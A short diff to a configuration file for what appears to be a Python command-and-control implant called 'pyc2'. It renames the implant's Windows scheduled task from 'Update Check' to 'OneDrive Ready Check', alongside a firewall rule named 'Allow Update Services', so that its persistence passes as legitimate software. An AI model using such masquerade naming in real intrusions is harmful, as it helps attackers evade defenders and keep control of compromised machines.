@@ -71,4 +71,4 @@ pyc2_firewall_name: "Allow Update Services"
 pyc2_debug: "True"
 pyc2_buffer_size: 4096
 pyc2_timeout_time: 15
-pyc2_task_name_win: "Update Check"
+pyc2_task_name_win: "OneDrive Ready Check"
